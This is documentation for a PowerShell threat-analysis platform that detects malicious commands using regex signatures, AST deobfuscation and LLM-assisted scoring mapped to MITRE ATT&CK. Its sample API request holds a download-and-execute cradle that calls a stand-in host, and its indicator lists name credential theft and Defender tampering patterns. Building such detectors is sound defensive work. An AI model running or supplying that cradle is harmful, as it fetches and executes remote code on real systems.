# powershell.exposed - Complete Documentation

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [API Service (FastAPI)](#api-service-fastapi)
  - [Endpoints](#endpoints)
  - [Request/Response Models](#requestresponse-models)
  - [Services Layer](#services-layer)
  - [Detectors](#detectors)
  - [Middleware](#middleware)
  - [Utilities](#utilities)
- [AST Deobfuscation Service (PowerShell/Pode)](#ast-deobfuscation-service-powershellpode)
  - [Endpoints](#ast-endpoints)
  - [Deobfuscation Passes](#deobfuscation-passes)
  - [Configuration](#ast-configuration)
- [Frontend (Next.js)](#frontend-nextjs)
  - [Pages & Routes](#pages--routes)
  - [Components](#components)
  - [Client-Side API Routes](#client-side-api-routes)
- [Detection System](#detection-system)
  - [Indicator Format](#indicator-format)
  - [Indicator Categories](#indicator-categories)
  - [Risk Scoring](#risk-scoring)
  - [Evasion Detection (san_regex)](#evasion-detection-san_regex)
  - [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Database Schema (Supabase)](#database-schema-supabase)
- [Authentication & Authorization](#authentication--authorization)
- [Rate Limiting](#rate-limiting)
- [Caching](#caching)
- [Deobfuscation Pipeline](#deobfuscation-pipeline)
- [Docker & Deployment](#docker--deployment)
- [CI/CD Pipeline](#cicd-pipeline)
- [Configuration Reference](#configuration-reference)
- [Dependencies](#dependencies)

---

## Overview

**powershell.exposed** is a web-based security analysis platform that detects malicious patterns in PowerShell commands. It combines signature-based detection, AST-safe deobfuscation, and LLM-powered analysis to provide risk scoring, MITRE ATT&CK mapping, and detailed threat intelligence reports.

Key capabilities:

- **92 detection indicators** covering encoding, obfuscation, credential theft, persistence, defense evasion, AD enumeration, and more
- **Multi-layer deobfuscation**: Base64 decoding, AST-based static analysis (31 passes), and GPU-hosted LLM analysis (Qwen via RunPod)
- **MITRE ATT&CK mapping** of detected tactics and techniques
- **Risk scoring** from 0.0 to 10.0 with severity classification (info / medium / high / critical)
- **Evasion-aware analysis** using sanitization regex (`san_regex`) to strip obfuscation characters before pattern matching
- **No code execution** - all analysis is performed statically via AST parsing

---

## Architecture

```
                        +------------------+
                        |    Frontend      |
                        |  (Next.js 15)    |
                        |   Port: 3000     |
                        +--------+---------+
                                 |
                                 | HTTPS
                                 v
                        +------------------+
                        |   API Service    |
                        |  (FastAPI/Python)|
                        |   Port: 8000     |
                        +--+----------+----+
                           |          |
              +------------+          +-------------+
              |                                     |
              v                                     v
    +------------------+                  +------------------+
    |  AST Service     |                  |   RunPod LLM     |
    | (PowerShell/Pode)|                  |  (Qwen Model)    |
    |   Port: 8081     |                  |  GPU Serverless   |
    +------------------+                  +------------------+
              |
              v
    +------------------+
    |    Supabase      |
    |  (PostgreSQL +   |
    |   Auth + RLS)    |
    +------------------+
```

| Service         | Technology            | Port | Description                                      |
| --------------- | --------------------- | ---- | ------------------------------------------------ |
| **Frontend**    | Next.js 15 / React 19 | 3000 | Web UI for command input, results, and dashboards |
| **API**         | FastAPI / Python      | 8000 | Core analysis engine, auth, caching, scoring      |
| **AST Service** | Pode / PowerShell 7   | 8081 | Safe AST deobfuscation (Docker container)         |
| **LLM**        | Qwen via RunPod       | -    | GPU-hosted LLM for advanced deobfuscation         |
| **Database**    | Supabase (PostgreSQL) | -    | Storage, auth, row-level security                 |

---

## API Service (FastAPI)

Entry point: `api/main.py`

### Endpoints

#### System

| Method | Path      | Auth     | Description   |
| ------ | --------- | -------- | ------------- |
| GET    | `/`       | None     | Root fallback |
| GET    | `/health` | None     | Health check  |
| GET    | `/docs`   | None     | Swagger UI    |
| GET    | `/redoc`  | None     | ReDoc docs    |

#### Analysis (`api/routes/analysis_routes.py`)

| Method | Path                                  | Auth               | Description                              |
| ------ | ------------------------------------- | ------------------ | ---------------------------------------- |
| POST   | `/evaluate`                           | Frontend or API Key | Analyze a PowerShell command             |
| GET    | `/user-analyses`                      | JWT                | List user's past analyses                |
| GET    | `/analysis/{analysis_id}`             | JWT or API Key     | Get a specific analysis by short_id      |
| POST   | `/review-request`                     | JWT                | Submit a false positive/negative report  |
| GET    | `/deobfuscation-status/{short_id}`    | JWT or API Key     | Poll async LLM deobfuscation progress    |
| GET    | `/user/command-evaluations`           | JWT or API Key     | Paginated evaluations with filtering     |

#### Users (`api/routes/user_routes.py`)

| Method | Path                     | Auth | Description               |
| ------ | ------------------------ | ---- | ------------------------- |
| POST   | `/create-user-session`   | None | Create anonymous session  |
| GET    | `/user/profile`          | JWT  | Get user profile          |
| PATCH  | `/user/profile`          | JWT  | Update profile            |
| GET    | `/user/statistics`       | JWT  | Get user analysis stats   |

#### API Keys (`api/routes/api_key_routes.py`)

| Method | Path             | Auth | Description       |
| ------ | ---------------- | ---- | ----------------- |
| GET    | `/user/api-key`  | JWT  | Retrieve API key  |
| POST   | `/user/api-key`  | JWT  | Create API key    |
| DELETE | `/user/api-key`  | JWT  | Revoke API key    |
| PUT    | `/user/api-key`  | JWT  | Regenerate API key|

### Request/Response Models

Defined in `api/models/schemas.py`.

#### AnalyzeCommandRequest

```json
{
  "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')",
  "user_id": "optional-uuid",
  "session_id": "optional-uuid",
  "search_type": "WEB | API",
  "ip_address": "optional",
  "country": "optional",
  "city": "optional",
  "region": "optional",
  "timezone": "optional"
}
```

- `command` is required, max 100,000 characters.
- All other fields are optional and populated automatically by the frontend.

#### AnalyzeCommandResponse

```json
{
  "success": true,
  "analysis_id": "kcxlljo9",
  "session_id": "uuid",
  "analysis": {
    "command": "...",
    "risk_score": 7.5,
    "severity": "high",
    "signatures_detected": [
      {
        "name": "Invoke-Expression cmdlet",
        "description": "Spots potential use of Invoke-Expression cmdlet and its alias",
        "severity": "medium",
        "base_score": 5.0,
        "matches_found": 1,
        "total_score": 5.0,
        "max_match_allowed": 1,
        "matches_details": [
          {
            "pattern": "Invoke-Expression|\\biex\\b",
            "matched_text": "IEX",
            "position": { "start": 0, "end": 3 },
            "match_number": 1
          }
        ],
        "tactics": ["TA0002"],
        "techniques": ["T1059.001"],
        "reference": ["https://..."],
        "link": "https://github.com/...",
        "indicator_type": "community"
      }
    ],
    "tactics": ["TA0002"],
    "techniques": ["T1059.001"],
    "total_signatures_checked": 92,
    "detected_count": 3,
    "cache_info": { "cached": false, "cache_age_minutes": 0.0 },
    "decoded_command": null,
    "double_decoded_command": null,
    "deobfuscated_command": null,
    "deobfuscation_techniques": null
  }
}
```

#### Other Models

| Model                            | Purpose                                      |
| -------------------------------- | -------------------------------------------- |
| `DetectedSignature`              | Single signature match with match details    |
| `SignatureMatch`                  | Individual regex match (text, position)       |
| `CacheInfo`                      | Cache hit status and age                     |
| `ApiKeyData` / `ApiKeyResponse`  | API key management responses                 |
| `UserProfile` / `UserProfileResponse` | User profile data                      |
| `ErrorResponse`                  | Standardized error format                    |
| `RateLimitResponse`              | Rate limit exceeded with reset timer          |
| `PaginationParams`               | Limit/offset/short_id filtering              |
| `CommandEvaluationResponse`      | Single evaluation record                     |
| `UserCommandEvaluationsResponse` | Paginated list of evaluations                |
| `ReviewRequestCreate`            | False positive/negative report submission    |

### Services Layer

Located in `api/services/`.

#### PowerShell Analyzer (`powershell_analyzer.py`)

Core analysis engine:

1. **`load_signatures_from_db(user_id)`** - Loads active signatures from `powershell_signatures` and `premium_indicators` tables. Premium users get additional indicators. Results cached in-memory with TTL.
2. **`analyze_command_patterns(command, signatures)`** - Matches the command against all loaded regex patterns. For each match: records position, matched text, calculates score (base_score * match_count, capped by `max_match_allowed`).
3. **`calculate_severity_and_risk(score)`** - Maps cumulative score to severity level.
4. **`save_analysis_to_db(...)`** - Persists the full analysis result to `powershell_analyses`.
5. **`generate_short_id(length=8)`** - Creates human-readable analysis identifiers.

#### Cache Service (`cache_service.py`)

CRC32-based result caching:

- **`generate_phash(command)`** - Computes CRC32 hash for cache key.
- **`check_cache(phash)`** - Looks up existing analysis in `cache_results` table.
- **`save_to_cache(phash, result)`** - Stores result blob with TTL. FIFO eviction at 5 entries.
- AI overviews are cached alongside the analysis result.

#### AST Client (`ast_client.py`)

Async HTTP client to the PowerShell AST service:

- Sends commands to `http://localhost:8081/deobfuscate`
- Timeout: 35 seconds
- Returns deobfuscated command and techniques found
- Graceful fallback on errors

#### RunPod Client (`runpod_client.py`)

GPU-hosted LLM deobfuscation via RunPod serverless:

- **`submit_job(command)`** - Posts encoded command to RunPod; returns `job_id` immediately.
- **`poll_job(job_id)`** - Adaptive polling schedule for cold-start resilience:
  - 0-60s: every 5s (warm workers)
  - 60-300s: every 15s (typical cold starts)
  - 300-600s: every 30s (slow cold starts)
  - Hard cap: 600s (10 minutes)
- **`deobfuscate(command)`** - Convenience wrapper (submit + poll).
- Uses a Qwen model with a system prompt that instructs it to resolve tick marks, format strings, concatenation, char codes, Base64, string reversals, ScriptBlock invocations, IEX wrappers, etc.

#### Deobfuscation Queue (`deobfuscation_queue.py`)

Background async worker for LLM deobfuscation:

- Max 2 concurrent jobs
- Queue capacity: 100 jobs
- Job states: `processing` -> `completed` / `failed`
- Result TTL: 1 hour (3600s)
- Orphaned job recovery on startup
- Results include new signatures discovered post-deobfuscation

#### API Key Manager (`api_key_manager.py`)

- Key format: `pse_` + 32 random alphanumeric characters
- One active key per user (stored in `profiles` table)
- Tracks: `usage_count`, `last_used_at`, `is_active`
- Functions: `create_user_api_key()`, `validate_api_key()`, `update_api_key_usage()`

#### Session Manager (`session_manager.py`)

- Initializes Supabase client with service role
- Creates sessions in `sessions` table
- Manages per-session context

#### Plan Service (`plan_service.py`)

- Tier management: free / premium / enterprise
- Feature flags: `can_decode_commands`, `can_deobfuscate`
- Per-plan request and decode limits
- `check_session_rate_limit_from_db()` - Enforces plan-specific quotas

#### AI Service (`ai_service.py`)

- Generates natural-language overviews of analyzed commands using OpenAI (`gpt-4o-mini`)
- Optional feature (toggled via env)
- Max 200 tokens per response
- 10s timeout

### Detectors

Located in `api/services/detectors/`.

| Detector                         | File                           | Description                                                  |
| -------------------------------- | ------------------------------ | ------------------------------------------------------------ |
| **Encoded Command Detector**     | `encoded_command_detector.py`  | Detects `-EncodedCommand` parameter variants, decodes Base64 UTF-16-LE |
| **Double Encoded Detector**      | `double_encoded_detector.py`   | Detects and recursively decodes nested encoding layers       |
| **Evasion Detector**             | `evasion_detector.py`          | Applies `san_regex` sanitization, compares pre/post matches  |
| **Obfuscation Detector**         | `obfuscation_detector.py`      | Pattern-based obfuscation technique identification           |
| **Patterns**                     | `patterns.py`                  | Central regex pattern definitions                            |

### Middleware

Located in `api/middleware/`.

| Middleware                | File                      | Description                                              |
| ------------------------- | ------------------------- | -------------------------------------------------------- |
| **Authentication**        | `auth_middleware.py`      | JWT validation (Supabase), API key validation, role-based access |
| **Rate Limiting**         | `rate_limiting.py`        | Per-session, per-user, and global rate limits             |
| **Frontend Validation**   | `frontend_validation.py`  | Origin/Referer checking, blocks unauthorized direct API access |
| **CORS**                  | `cors_middleware.py`      | Cross-origin resource sharing headers                    |

### Utilities

| Utility          | File               | Description                                           |
| ---------------- | ------------------ | ----------------------------------------------------- |
| **Auth**         | `utils/auth.py`    | JWT decoding, user extraction, permission verification |
| **Geolocation**  | `utils/geolocation.py` | IP geolocation via ipapi.co (10s timeout)          |

---

## AST Deobfuscation Service (PowerShell/Pode)

A microservice that performs **safe, static AST-based deobfuscation** of PowerShell commands. It never executes the input code - all transformations are done through `[System.Management.Automation.Language.Parser]::ParseInput()`.

Entry point: `ast-service/server.ps1`

### AST Endpoints

| Method | Path           | Auth                  | Description                          |
| ------ | -------------- | --------------------- | ------------------------------------ |
| GET    | `/health`      | None                  | Service health, version, config      |
| POST   | `/deobfuscate` | Optional `X-Api-Key`  | Deobfuscate a PowerShell command     |
| POST   | `/detonate`    | Optional `X-Api-Key`  | Detonate and analyze (sandbox)       |
| POST   | `/analyze-ast` | Optional `X-Api-Key`  | Raw AST analysis                     |

#### POST /deobfuscate

**Request:**
```json
{ "command": "PowerShell code to deobfuscate" }
```

**Response:**
```json
{
  "original": "obfuscated code...",
  "deobfuscated": "clean code...",
  "iterations": 3,
  "techniques_found": ["tick insertion", "format string", "string concatenation"],
  "transformations": [...],
  "is_fully_deobfuscated": true,
  "error": null
}
```

### Deobfuscation Passes

The deobfuscator (`ast-service/scripts/deobfuscator.ps1`) applies up to 31 transformation passes in order:

| Pass   | Name                        | Description                                                   |
| ------ | --------------------------- | ------------------------------------------------------------- |
| 0      | Unicode normalization       | Normalizes Unicode quotes (smart quotes, backtick variants) to ASCII |
| 0.1    | Pipeline noise removal      | Strips extraneous pipeline elements                           |
| 0.5    | Launcher stripping          | Removes `powershell.exe`/`pwsh` launcher prefixes             |
| 1      | Tick removal                | Removes PowerShell escape ticks (`` ` ``) from identifiers    |
| 1.1    | ScriptBlock wrapper         | Unwraps `& { ... }` and `. { ... }` wrappers                 |
| 1.5    | ShellId substitution        | Resolves `$ShellId` variable references                       |
| 1.6    | Environment variable        | Resolves `$env:*` references                                  |
| 1.7    | Verbose preference          | Resolves `$VerbosePreference` tricks                          |
| 1.8    | String reversal             | Detects and reverses reversed strings                         |
| 1.85   | String index slicing        | Resolves string indexing/slicing operations                   |
| 1.9    | Simple reversal             | Handles simple `-join` reversal patterns                      |
| 2      | Arithmetic char codes       | Resolves `[char](65+10)` style expressions                   |
| 2.1    | Char code resolution        | Resolves `[char]0x41`, `[char]65` patterns                    |
| 2.7    | String::Join char pipeline  | Resolves `[string]::join` with char pipelines                 |
| 3      | Format string               | Expands `"{0}{1}" -f 'a','b'` format operators                |
| 3.5    | Bareword format             | Handles format operators on bareword strings                  |
| 4      | Concat + regex chain        | Resolves string concatenation and regex replacement chains    |
| 5      | Join operator               | Resolves `-join` array operations                             |
| 5.5    | Scalar join identity        | Resolves scalar join identity patterns                        |
| 6      | Replace operator            | Applies `-replace` and `.Replace()` transformations           |
| 7      | Variable substitution       | Substitutes known variable values                             |
| 8      | Deflate decompression       | Decompresses `DeflateStream` encoded payloads                 |
| 9      | Base64 decoding             | Decodes `[Convert]::FromBase64String()` patterns              |
| 9.3    | Unicode Base64              | Handles UTF-16 Base64 encoded strings                         |
| 9.5    | Variable Base64             | Resolves Base64 stored in variables                           |
| 10     | IEX removal                 | Strips `Invoke-Expression`/`IEX` wrappers                    |
| 11     | Hex conversion              | Resolves hex-encoded characters                               |
| 12     | Base conversion             | Handles arbitrary base number conversions                     |
| 13     | ScriptBlock invoke          | Unwraps `.Invoke()` on scriptblocks                           |
| 14     | Disguised IEX               | Detects obfuscated invocation patterns                        |
| 14.5   | Invocation string literal   | Resolves string-literal invocations                           |
| 15     | Type casting                | Handles type cast obfuscation                                 |

All passes iterate up to `MaxIterations` (default: 10) or until no further changes are detected.

### AST Configuration

| Variable            | Default   | Description                        |
| ------------------- | --------- | ---------------------------------- |
| `PORT`              | `8081`    | HTTP listen port                   |
| `MAX_INPUT_LENGTH`  | `100000`  | Maximum command length (chars)     |
| `TIMEOUT_SECONDS`   | `30`      | Per-request timeout                |
| `MAX_ITERATIONS`    | `10`      | Max deobfuscation iteration loops  |
| `AST_API_KEY`       | (env)     | Optional authentication key        |

---

## Frontend (Next.js)

Built with **Next.js 15** (App Router), **React 19**, **Tailwind CSS 4**, and **Supabase Auth**.

### Pages & Routes

| Route                  | Description                                           |
| ---------------------- | ----------------------------------------------------- |
| `/`                    | Landing page                                          |
| `/evaluate`            | Main analysis interface - command input and results    |
| `/analysis`            | Analysis results page                                 |
| `/analysis/[id]`       | Detailed analysis view with full signature breakdown   |
| `/dashboard`           | User dashboard with stats and recent analyses         |
| `/history`             | Paginated analysis history                            |
| `/indicators`          | Browse all detection signatures                       |
| `/indicators/[id]`     | Individual indicator details                          |
| `/api-keys`            | API key management (create, revoke, regenerate)       |
| `/scoring`             | Risk scoring methodology explanation                  |
| `/detonate`            | Detonation/sandbox analysis interface                 |
| `/settings`            | User settings                                         |
| `/login`               | Login page                                            |
| `/register`            | Registration page                                     |
| `/auth/confirm`        | Email confirmation callback                           |
| `/about`               | About the project                                     |
| `/pricing`             | Subscription plans                                    |
| `/terms`               | Terms of service                                      |
| `/signatures`          | Alternative signatures browser                        |

### Components

**Analysis:**
- `CommandInput` - Text input with syntax hints
- `AnalysisCard` - Result display card
- `AnalysisSkeleton` - Loading placeholder
- `AnalysisChat` - AI overview chat interface
- `AiOverviewCard` - AI-generated summary display

**Detection:**
- `IndicatorTable` - Detected signatures table
- `IndicatorsSummaryTable` - Summary statistics
- `CmdletCard` - Detected cmdlets
- `SeverityBadge` - Color-coded severity label

**Layout:**
- `Navbar` - Navigation header
- `Footer` - Page footer
- `LoadingSpinner` - Spinner component
- `Messages` - Alert/notification system
- `HamburgerButton` - Mobile navigation toggle
- `CookieBanner` - Cookie consent

**User Management:**
- `ApiKeyManager` - API key CRUD interface
- `ApiKeyRevealModal` - Secure key display modal
- `ReviewRequestModal` - False positive submission
- `PricingCard` - Subscription plan display

### Client-Side API Routes

The Next.js frontend includes API routes that proxy requests to the FastAPI backend:

| Route                         | Proxies To       |
| ----------------------------- | ---------------- |
| `/api/analyze`                | `/evaluate`      |
| `/api/analysis/[id]`          | `/analysis/{id}` |
| `/api/indicators`             | Signatures list  |
| `/api/indicators/[id]`        | Signature detail |

---

## Detection System

### Indicator Format

Each indicator is a YAML file in the `indicators/` directory (92 total):

```yaml
name: Invoke-Expression cmdlet
description: Spots potential use of Invoke-Expression cmdlet and its alias.
regex: Invoke-Expression|\biex\b
san_regex: [&,`'"()^+/]+
san_score: 10.0
basescore: 5.0
tactic: TA0002
technique: T1059.001
reference:
  - https://github.com/SigmaHQ/sigma/blob/master/rules/...
```

| Field         | Type       | Description                                                    |
| ------------- | ---------- | -------------------------------------------------------------- |
| `name`        | string     | Unique indicator name                                          |
| `description` | string     | What the indicator detects                                     |
| `regex`       | string     | Main detection regex pattern                                   |
| `san_regex`   | string     | Sanitization regex - chars to strip before re-matching         |
| `san_score`   | float      | Score applied when evasion is detected via san_regex            |
| `basescore`   | float      | Base score (0-10) for this indicator                           |
| `tactic`      | string     | MITRE ATT&CK tactic ID (e.g. `TA0002`)                        |
| `technique`   | string[]   | MITRE ATT&CK technique IDs (e.g. `T1059.001`)                 |
| `reference`   | string[]   | External reference URLs (Sigma rules, MITRE, etc.)             |

### Indicator Categories

**Encoding & Obfuscation** (15+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `plain_encoded_command` | Detects `-EncodedCommand` parameter |
| `obfuscated_encoded_command` | Obfuscated variants of `-EncodedCommand` |
| `nested_encoded_command` | Multiple encoding layers |
| `long_base64_string` | Large Base64 payloads |
| `overly_large_base64_payload` | Extremely large Base64 content |
| `base64_conversion` | Base64 conversion functions |
| `notable_charset` | Unusual character set patterns |

**Execution & Invocation** (10+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `invoke_expression_cmdlet` | `Invoke-Expression` / `IEX` |
| `suspicious_cmdlet` | Known malicious cmdlets |
| `uncommon_alias_reference` | Uncommon built-in aliases |
| `noteworthy_code_construct` | Suspicious code patterns |
| `notable_invoke_expression` | IEX variants |
| `downgrade_attack` | PowerShell version downgrade |

**Network & Download** (10+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `file_download_via_web_client` | `Net.WebClient` download methods |
| `web_client_traces` | Web client usage patterns |
| `powershell_script_download` | Script download indicators |
| `potential_binary_download` | Binary file downloads |
| `https_usage` | HTTPS over uncommon ports |
| `ftp_usage` | FTP connections |
| `suspicious_tld_reference` | Malicious TLD references |
| `suspicious_dns` | DNS query indicators |
| `loopback_address` | Loopback/localhost references |

**Credential Access** (5+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `credential_harvesting` | Credential scraping patterns |
| `notable_credential_ref` | Credential variable references |
| `email_ref` | Email address patterns |

**Active Directory** (6+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `ad_enumeration` | General AD queries |
| `ad_enumeration_cmdlets` | `Get-ADUser`, `Get-ADGroup`, etc. |
| `ad_priv_group_enumeration` | Privileged group enumeration |
| `ad_serviceprincipal_enumeration` | SPN enumeration |
| `local_admin_enumeration` | Local admin detection |
| `local_user_account_creation` | User account creation |
| `user_added_administrators` | Adding users to admin groups |

**Persistence** (8+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `scheduled_task_activity` | Task scheduler usage |
| `scheduled_task_modification` | Task modification |
| `registry_modification` | Registry key modification |
| `windows_registry_activity` | Registry access patterns |
| `autorun_registry_reference` | Autorun registry keys |
| `service_creation` | New service installation |
| `service_manipulation` | Service property changes |
| `service_modification` | Service configuration changes |

**Defense Evasion** (12+ indicators)

| Indicator | Description |
| --------- | ----------- |
| `potential_sysmon_evasion` | Sysmon bypass attempts |
| `potential_tampering_etw` | ETW tampering |
| `potential_tampering_with_ms_defender` | Defender manipulation |
| `ms_defender_exclusion_path` | Defender exclusion additions |
| `ms_defender_registry_path` | Defender registry manipulation |
| `eventlog_etw_manipulation` | Event log tampering |
| `memory_manipulation` | In-memory injection |
| `system_reflection_assembly` | Reflection-based loading |
| `system_management_automation` | SMA namespace abuse |

**Suspicious Keywords** (tiered detection)

| Indicator | Severity | Examples |
| --------- | -------- | -------- |
| `remarkably_suspicious_keywords` | Critical | Most dangerous keywords |
| `highly_suspicious_keywords` | High | Known malicious terms |
| `fairly_suspicious_keywords` | Medium | Suspicious but contextual |
| `slightly_suspicious_keywords` | Low | Low-confidence indicators |

**Other Categories:**
- File operations: `sketchy_file`, `binary_via_outfile`, `compressed_file_manipulation`
- System: `wmi_usage`, `ps_remoting`, `remote_command`, `fw_rule_creation`
- Process: `threads_manipulation`, `named_pipe_activity`, `screen_manipulation`
- Network: `proxy_config`, `tcplistener_ref`, `potential_im_communication`
- Data: `clipboard_manipulation`, `potential_data_staging`, `virtual_disk_activity`
- Reconnaissance: `network_recon`, `security_agent_enumeration`, `critical_registry_path`

### Risk Scoring

Scoring is cumulative across all matched indicators:

```
For each matched signature:
    signature_score = basescore * min(matches_found, max_match_allowed)

total_score = sum(all signature_scores)
final_risk_score = min(total_score, 10.0)
```

Severity thresholds:

| Score Range | Severity     |
| ----------- | ------------ |
| 0.0 - 3.0   | **Info**     |
| 3.1 - 6.0   | **Medium**   |
| 6.1 - 9.0   | **High**     |
| 9.1 - 10.0  | **Critical** |

### Evasion Detection (san_regex)

The `san_regex` field enables detection of obfuscated commands that evade the primary `regex`:

1. The command is matched against `regex` normally.
2. Characters matching `san_regex` are stripped from the command (e.g., backticks, quotes, carets, parentheses).
3. The sanitized command is matched against `regex` again.
4. If new matches appear after sanitization, evasion is detected and the `san_score` is applied instead of (or in addition to) the `basescore`.

Example: The command `` I`nv`oke-Exp`ress`ion `` evades `Invoke-Expression` regex, but after stripping backticks via `san_regex: [&,\x60'"()^+/]+`, it becomes `Invoke-Expression` and matches.

### MITRE ATT&CK Mapping

Each indicator maps to MITRE ATT&CK tactics and techniques:

| Tactic ID | Name                    | Coverage |
| --------- | ----------------------- | -------- |
| TA0001    | Initial Access          | Web downloads, script execution |
| TA0002    | Execution               | PowerShell, IEX, cmdlets |
| TA0003    | Persistence             | Scheduled tasks, registry, services |
| TA0004    | Privilege Escalation    | Admin enumeration, service creation |
| TA0005    | Defense Evasion         | Obfuscation, Defender bypass, ETW tampering |
| TA0006    | Credential Access       | Credential harvesting, mimikatz patterns |
| TA0007    | Discovery               | AD enumeration, network recon, security tools |
| TA0008    | Lateral Movement        | PS Remoting, remote commands |
| TA0009    | Collection              | Clipboard, screen capture, data staging |
| TA0010    | Exfiltration            | FTP, web uploads, DNS exfil |
| TA0011    | Command and Control     | Web client, suspicious TLDs, uncommon ports |

---

## Database Schema (Supabase)

### Tables

#### `profiles`

User accounts and API key storage.

| Column              | Type        | Description                        |
| ------------------- | ----------- | ---------------------------------- |
| `id`                | UUID (PK)   | From `auth.users`                  |
| `username`          | TEXT UNIQUE | Display name                       |
| `email`             | TEXT        | User email                         |
| `full_name`         | TEXT        | Full name                          |
| `avatar_url`        | TEXT        | Profile image URL                  |
| `is_premium_user`   | BOOLEAN     | Premium tier flag                  |
| `api_key`           | TEXT        | API key (`pse_xxx`)                |
| `api_key_name`      | TEXT        | Key label                          |
| `api_key_created_at`| TIMESTAMP   | Key creation time                  |
| `api_key_last_used_at`| TIMESTAMP | Last usage time                    |
| `api_key_usage_count`| INT        | Total API calls with this key      |
| `api_key_is_active` | BOOLEAN     | Whether key is active              |
| `notify_user`       | BOOLEAN     | Email notification preference      |
| `created_at`        | TIMESTAMP   | Account creation                   |
| `updated_at`        | TIMESTAMP   | Last update                        |

#### `powershell_analyses`

Analysis results storage.

| Column                  | Type          | Description                          |
| ----------------------- | ------------- | ------------------------------------ |
| `id`                    | BIGSERIAL (PK)| Auto-increment ID                   |
| `uuid`                  | UUID          | Unique analysis identifier           |
| `short_id`              | TEXT          | 8-char readable ID                   |
| `user_id`               | UUID (FK)     | Reference to profiles                |
| `session_id`            | UUID          | Session tracking                     |
| `command`               | TEXT          | Analyzed command                     |
| `risk_score`            | DECIMAL(3,1)  | 0.0 - 10.0                          |
| `severity`              | TEXT          | info / medium / high / critical      |
| `signatures_detected`   | JSONB         | Array of matched signatures          |
| `cmdlets_detected`      | JSONB         | Detected PowerShell cmdlets          |
| `tactics`               | JSONB         | MITRE ATT&CK tactics                |
| `techniques`            | JSONB         | MITRE ATT&CK techniques             |
| `decoded_command`       | TEXT          | Base64 decoded content               |
| `double_decoded_command` | TEXT         | Double-decoded content               |
| `deobfuscated_command`  | TEXT          | AST deobfuscated output              |
| `analysis_result`       | JSONB         | Full result blob                     |
| `search_type`           | TEXT          | `WEB` or `API`                       |
| `ip_address`            | INET          | Client IP                            |
| `ip_country`            | TEXT          | Geolocation country                  |
| `ip_city`               | TEXT          | Geolocation city                     |
| `ip_region`             | TEXT          | Geolocation region                   |
| `is_cache`              | BOOLEAN       | Whether result was from cache        |
| `created_at`            | TIMESTAMP     | Analysis timestamp                   |

**Indexes:** `user_id`, `created_at DESC`, `risk_score DESC`, `tactics` (GIN), `techniques` (GIN)

#### `powershell_signatures`

Main detection signature definitions.

| Column                | Type        | Description                    |
| --------------------- | ----------- | ------------------------------ |
| `id`                  | BIGSERIAL   | Auto-increment ID              |
| `name`                | TEXT UNIQUE | Indicator name                 |
| `description`         | TEXT        | What it detects                |
| `regex`               | TEXT        | Detection pattern              |
| `san_regex`           | TEXT        | Sanitization pattern           |
| `basescore`           | DECIMAL     | Base risk score (0-10)         |
| `is_active`           | BOOLEAN     | Whether indicator is active    |
| `is_premium_indicator`| BOOLEAN     | Premium-only flag              |
| `tactic`              | TEXT        | MITRE ATT&CK tactic           |
| `technique`           | TEXT[]      | MITRE ATT&CK techniques       |
| `reference`           | TEXT[]      | Reference URLs                 |
| `file_path`           | TEXT        | GitHub file path               |
| `link`                | TEXT        | GitHub link                    |

#### `premium_indicators`

Additional premium-only detection signatures (same schema as `powershell_signatures`).

#### `cache_results`

Analysis result cache.

| Column         | Type      | Description                |
| -------------- | --------- | -------------------------- |
| `phash`        | BIGINT PK | CRC32 hash of command      |
| `results_blob` | JSONB     | Full cached analysis       |
| `ai_overview`  | TEXT      | Cached AI summary          |
| `created_at`   | TIMESTAMP | Cache entry creation       |
| `updated_at`   | TIMESTAMP | Last update                |

Max 5 entries; oldest evicted on overflow (FIFO).

#### `sessions`

Anonymous and authenticated session tracking.

| Column       | Type        | Description          |
| ------------ | ----------- | -------------------- |
| `id`         | UUID (PK)   | Session ID           |
| `user_id`    | UUID (FK)   | Optional user ref    |
| `ip_address` | INET        | Client IP            |
| `user_agent` | TEXT        | Browser user agent   |
| `country`    | TEXT        | Geolocation country  |
| `created_at` | TIMESTAMP   | Session start        |

#### `plans`

Subscription tier definitions.

| Column                   | Type      | Description                     |
| ------------------------ | --------- | ------------------------------- |
| `id`                     | BIGSERIAL | Plan ID                         |
| `name`                   | TEXT      | `free` / `premium` / `enterprise` |
| `description`            | TEXT      | Plan description                |
| `request_limit_per_hour` | INT       | Hourly request quota            |
| `decode_limit_per_hour`  | INT       | Hourly decode quota             |
| `can_decode_commands`    | BOOLEAN   | Base64 decode access            |
| `can_deobfuscate`        | BOOLEAN   | Deobfuscation access            |
| `is_active`              | BOOLEAN   | Whether plan is available       |

### Row-Level Security

RLS is enabled on `profiles` and `powershell_analyses`:
- Users can only read and update their own profile
- Users can only read and write their own analyses
- Service role bypasses all RLS policies

---

## Authentication & Authorization

### Methods

| Method         | Format                          | Use Case                       |
| -------------- | ------------------------------- | ------------------------------ |
| **JWT Token**  | `Authorization: Bearer <jwt>`   | Web app authenticated users    |
| **API Key**    | `Authorization: Bearer pse_xxx` | External tools (Postman, cURL) |
| **Anonymous**  | No auth header                  | Web app only (origin-checked)  |

### Flow

1. **Web app users** authenticate via Supabase Auth (email/password). JWT tokens are issued and validated against `SUPABASE_JWT_SECRET`.
2. **API key users** generate a key via their profile (`POST /user/api-key`). Keys are format-validated (`pse_` prefix) and looked up in the `profiles` table.
3. **Anonymous access** is allowed only from authorized frontend origins. The `frontend_validation` middleware checks `Origin` and `Referer` headers against a whitelist.

### Access Matrix

| Endpoint            | Anonymous (frontend) | JWT   | API Key |
| ------------------- | -------------------- | ----- | ------- |
| `POST /evaluate`    | Yes                  | Yes   | Yes     |
| `GET /user/profile` | No                   | Yes   | No      |
| `POST /user/api-key`| No                   | Yes   | No      |
| `GET /user/command-evaluations` | No        | Yes   | Yes     |
| `GET /analysis/{id}`| No                   | Yes   | Yes     |

---

## Rate Limiting

Three layers of rate limiting:

| Layer          | Limit              | Window  | Scope              |
| -------------- | ------------------ | ------- | ------------------- |
| **Global**     | 1,000 requests     | 60s     | All API requests    |
| **Per-session**| Plan-dependent     | 60s     | Per session ID      |
| **Per-user decode** | 5 decodes     | 60s     | Per user (free tier)|

Rate limit responses include:
```json
{
